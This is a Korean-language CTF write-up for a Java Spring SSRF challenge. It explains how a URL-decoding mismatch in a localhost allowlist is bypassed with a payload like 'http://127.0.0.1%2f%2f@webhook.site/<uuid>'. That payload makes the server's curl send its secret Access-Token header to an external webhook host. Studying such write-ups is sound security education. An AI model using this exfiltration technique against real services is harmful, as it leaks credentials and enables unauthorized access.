먼저 `TestApi.java`를 보면

```java
@GetMapping("/flag")
public ResponseEntity<Map<String, String>> getFlag(@RequestHeader(value="Access-Token", required=true) String accessToken){
    ...
    if (!accessToken.equals("[**REDACTED**]")){
        ...
        response.put("message", "Access token is not Valid");
        return ResponseEntity.status(400).body(response);
    }
    response.put("result", "success");
    response.put("message", flag);
    return ResponseEntity.ok(response);
}
```

이 코드를 보면 요청을 받을 때 `Access-Token` 값이 서버와 일치해야 flag를 출력하기에, `Access-Token`을 찾아줘야 합니다.

`ApiTestController.java`를 보면 `scheme`, `userInfo`, `host`, `path` 이 값들을 합쳐서 URL을 만드는 걸 확인할 수 있고,

```java
if (!userInfo.isEmpty()) {
    url = scheme + "://" + userInfo + "@" + host + path;
} else {
    url = scheme + "://" + host + path;
}
```

즉 `userInfo@host` 형태로도 만들 수 있습니다.

그리고

```java
String[] cmd = {"curl", "-H", "Access-Token: " + accessToken, "-s", url};
Process p = Runtime.getRuntime().exec(cmd);
```

이 부분을 보면 `/request`는 사용자가 고른 URL로 서버가 직접 요청을 보내는 것을 확인할 수 있었으니 SSRF 포인트가 됩니다.

그리고 서버에서 요청할 때 `Access-Token`을 붙여주니, 이때 저희는 한 가지 생각을 하게 됩니다.

서버가 우리가 원하는 위치로 요청을 보내게 할 수 있으면 거기에 붙어오는 `Access-Token`을 알 수 있지 않을까?

하지만

```java
public static final String[] ALLOWED_HOSTS = new String[]{
        "127.0.0.1",
        "localhost",
};
```

이 코드를 보면 아무 URL이나 허용하는 게 아닌 host 제한이 있습니다.

그리고

```java
String parsed_host = UriComponentsBuilder.fromHttpUrl(URLDecoder.decode(url)).build().getHost();
if (Arrays.asList(ALLOWED_HOSTS).contains(parsed_host)) {
    ...
}
```

이 부분에서 검토를 합니다.

이 말은 서버는 URL을 먼저 `URLDecoder.decode(url)`로 디코딩한 뒤 host를 추출하고, 그 호스트가 `localhost`거나 `127.0.0.1`일 때만 curl을 실행합니다.

즉 외부 사이트로는 요청을 못 보내고 내부 주소만 허용하는 것 같았습니다.

일단 제대로 동작하는지 확인해 보기 위해 `http`, `127.0.0.1:8080`, `/api/test`로 요청을 보냈고, `{"result":"success","message":"Good"}` 정상적으로 `/request`는 내부 주소로 curl 요청을 보내고 있었습니다.

그리고 이번엔 path 값에 flag를 넣고 호출해 보면 `You can't see the flag`가 출력되고, 이 의미는 출력되는 단계에서 막힌다는 의미이기에 호출에 성공하여 서버는 flag를 받았지만 가렸다는 뜻이므로, 서버가 쓰는 `Access-Token` 값을 알아내면 flag도 알 수 있다는 결론이 나옵니다.

`URLDecoder.decode(url)`로 검사하고 `curl ... url`로 요청하기에 검사할 땐 디코드된 문자열을 사용하고, 실제 curl 요청은 원본 문자열을 사용합니다. 이로써 같은 URL이라도 검사와 실제 요청에서 다르게 해석될 수도 있습니다.

그러므로 `webhook.site`를 사용해서 `127.0.0.1%2f%2f`, `webhook.site`, `/<uuid>`로 적으면 최종적으로 `http://127.0.0.1%2f%2f@webhook.site/<uuid>` 이런 형태가 되며, `%2f%2f`는 디코드하면 `//`가 되니 서버는 검사할 때 `http://127.0.0.1//@webhook.site/<uuid>`로 확인하고 통과시킬 것이고, `http://127.0.0.1%2f%2f@webhook.site/<uuid>`을 curl은 그대로 받으니 `http://`은 스킵하고 `127.0.0.1%2f%2f`는 `@` 앞에 있으니 `userinfo`, `webhook.site`은 `@` 뒤에 있으니 host가 되며 `/<uuid>`는 path가 됩니다.

그러므로 요청 대상은 `webhook.site`가 되니 `webhook.site`로 요청이 전송될 것이고, 이 과정에서 딸려온 `Access-Token`을 통해 `/api/flag`를 호출하여 flag를 획득하는 문제였습니다.
